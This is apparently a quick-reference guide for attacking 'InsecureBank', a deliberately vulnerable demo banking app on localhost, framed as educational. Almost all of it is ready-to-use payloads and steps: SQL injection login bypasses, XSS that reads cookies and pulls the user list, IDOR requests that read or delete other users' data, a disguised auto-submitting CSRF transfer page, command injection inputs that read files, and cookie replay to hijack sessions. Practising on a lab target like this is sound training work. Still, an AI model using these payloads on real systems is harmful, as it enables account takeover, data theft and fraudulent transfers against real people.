# Attack Execution Guide

Quick reference for executing security attacks on InsecureBank.

---

## 📑 Table of Contents

1. [SQL Injection](#-attack-1-sql-injection)
2. [Cross-Site Scripting (XSS)](#-attack-2-cross-site-scripting-xss)
3. [IDOR (Insecure Direct Object Reference)](#-attack-3-idor-insecure-direct-object-reference)
4. [CSRF (Cross-Site Request Forgery)](#-attack-4-csrf-cross-site-request-forgery)
5. [Command Injection](#-attack-5-command-injection)
6. [Privilege Escalation](#-attack-6-privilege-escalation)
7. [Session Hijacking](#-attack-7-session-hijacking)
8. [Monitoring Attacks](#-monitoring-attacks)
9. [Reset Instructions](#-reset-instructions)

---
---

## 🎯 Attack 1: SQL Injection

### Username Field Bypass
1. Go to `http://localhost:5173/login`
2. **Username:** `admin' OR 1=1 --`
3. **Password:** `anything`
4. Click **Sign in**
5. ✅ Logged in as admin

### Password Field Bypass
1. Go to `http://localhost:5173/login`
2. **Username:** `admin`
3. **Password:** `' OR 1=1 --`
4. Click **Sign in**
5. ✅ Logged in as admin

### Comment Bypass
1. Go to `http://localhost:5173/login`
2. **Username:** `admin'--`
3. **Password:** `anything`
4. Click **Sign in**
5. ✅ Logged in as admin

### Union-Based Extraction
1. Go to `http://localhost:5173/login`
2. **Username:** `' UNION SELECT * FROM users --`
3. **Password:** `anything`
4. Click **Sign in**
5. ✅ Check SQL console for results

---
---

## 🎯 Attack 2: Cross-Site Scripting (XSS)

### Profile XSS (Stored)
1. Login with any account
2. Go to **Dashboard** → **Profile**
3. In **Full Name** field, paste:
   ```html
   <img src=x onerror=alert('HACKED!')>
   ```
4. Click **Save Changes**
5. ✅ Alert pops up when anyone views your profile

### Search XSS (Reflected)
1. Login to the bank
2. Go to **Transfer Money**
3. In **Search Users** field, paste:
   ```html
   <img src=x onerror=alert('XSS Attack!')>
   ```
4. Click **Search**
5. ✅ Alert executes immediately

### Cookie Theft XSS
1. Login to the bank
2. Go to **Transfer Money**
3. In **Search Users** field, paste:
   ```html
   <img src=x onerror="console.log('[XSS] cookie=',document.cookie)">
   ```
4. Click **Search**
5. ✅ Check XSS console for stolen cookies

### Advanced Data Exfiltration
1. Login to the bank
2. Go to **Transfer Money**
3. In **Search Users** field, paste:
   ```html
   <img src=x onerror="if(!window.xssExecuted){window.xssExecuted=true;(async()=>{try{const api='http://localhost:5000';console.log('[XSS] cookie=',document.cookie);const r=await fetch(api+'/api/admin/users',{credentials:'include'});const users=await r.json();console.log('[XSS] users:',users);}catch(e){console.error('[XSS] error',e);}})()}">
   ```
4. Click **Search**
5. ✅ Check XSS console for complete database dump

---
---

## 🎯 Attack 3: IDOR (Insecure Direct Object Reference)

### View Other Users' Transactions
1. Login as `john_doe` (password: `password`)
2. Press **F12** to open Developer Tools
3. Go to **Console** tab
4. Paste and press Enter:
   ```javascript
   fetch('http://localhost:5000/api/transactions/1', {
     credentials: 'include'
   }).then(r => r.json()).then(console.log)
   ```
5. ✅ See admin's transactions (user ID 1)

### View Any User's Profile
1. Login as any user
2. Press **F12** → **Console**
3. Paste and press Enter:
   ```javascript
   fetch('http://localhost:5000/api/user/1', {
     credentials: 'include'
   }).then(r => r.json()).then(console.log)
   ```
4. ✅ See admin's profile data

### Access Admin User List
1. Login as regular user (not admin)
2. Press **F12** → **Console**
3. Paste and press Enter:
   ```javascript
   fetch('http://localhost:5000/api/admin/users', {
     credentials: 'include'
   }).then(r => r.json()).then(console.log)
   ```
4. ✅ See all users including passwords

### Delete Other Users
1. Login as regular user
2. Press **F12** → **Console**
3. Paste and press Enter:
   ```javascript
   fetch('http://localhost:5000/api/admin/user/3', {
     method: 'DELETE',
     credentials: 'include'
   }).then(r => r.json()).then(console.log)
   ```
4. ✅ User ID 3 deleted

---
---

## 🎯 Attack 4: CSRF (Cross-Site Request Forgery)

### Money Transfer Attack
1. Create file `attack.html` on your computer
2. Paste this code:
   ```html
   <!DOCTYPE html>
   <html>
   <head><title>You Won $1000!</title></head>
   <body>
       <h1>Congratulations! Click to claim your prize!</h1>
       <form id="sneaky" action="http://localhost:5000/api/transfer" method="POST" style="display:none;">
           <input name="fromUserId" value="2">
           <input name="toUsername" value="ycp27">
           <input name="amount" value="1000">
           <input name="description" value="CSRF Attack">
       </form>
       <script>
           setTimeout(() => {
               document.getElementById('sneaky').submit();
               alert('Money transferred!');
           }, 2000);
       </script>
   </body>
   </html>
   ```
3. Have victim login to bank
4. Victim opens `attack.html`
5. ✅ Money automatically transferred

---
---

## 🎯 Attack 5: Command Injection

### Database Dump
1. Login to bank (use SQL injection: `admin' OR 1=1 --`)
2. Go to **Transaction History**
3. In **Search Transactions** field, type: `dump_users`
4. Click **Search**
5. ✅ Check command console for user database

### File Discovery
1. Go to **Transaction History**
2. In **Search Transactions** field, type: `dir`
3. Click **Search**
4. ✅ See directory listing

### Read Sensitive Files
1. Go to **Transaction History**
2. In **Search Transactions** field, type: `type users.json`
3. Click **Search**
4. ✅ See user database contents

### System Information
1. Go to **Transaction History**
2. In **Search Transactions** field, type: `whoami`
3. Click **Search**
4. ✅ See current system user

### Network Information
1. Go to **Transaction History**
2. In **Search Transactions** field, type: `ipconfig`
3. Click **Search**
4. ✅ See network configuration

---
---

## 🎯 Attack 6: Privilege Escalation

### Access Admin Functions as Regular User
1. Login as `john_doe` (password: `password`)
2. Press **F12** → **Console**
3. Paste and press Enter:
   ```javascript
   fetch('http://localhost:5000/api/admin/users', {
     credentials: 'include'
   }).then(r => r.json()).then(console.log)
   ```
4. ✅ Access admin-only data

---
---

## 🎯 Attack 7: Session Hijacking

### Cookie Theft via XSS
1. Login to bank
2. Go to **Profile**
3. In **Full Name** field, paste:
   ```html
   <img src=x onerror="alert('Cookie: ' + document.cookie)">
   ```
4. Save profile
5. ✅ Cookie displayed when profile viewed

### Manual Cookie Manipulation
1. Login to bank
2. Press **F12** → **Application** tab → **Cookies**
3. Find `auth_token` cookie
4. Copy the value
5. Logout
6. Press **F12** → **Console**
7. Paste and press Enter:
   ```javascript
   document.cookie = "auth_token=PASTE_TOKEN_HERE"
   ```
8. Refresh page
9. ✅ Logged in without password

---
---

## 📊 Monitoring Attacks

### SQL Injection Console
- Appears on login page when SQL injection detected
- Shows query executed and injection type

### XSS Console
- Appears on Transfer Money page
- Shows cookie theft and data exfiltration

### Command Injection Console
- Appears on Transaction History page
- Shows command output and system information

---
---

## 🔄 Reset Instructions

### Reset Database
```bash
cd demo-files
mysql -u root -p vulnerable_bank < manual-db-setup.sql
```

### Clear Browser Data
1. Press **F12** → **Application** → **Storage**
2. Click **Clear site data**
3. Refresh page

---

**⚠️ Remember: These attacks are for educational purposes only!**
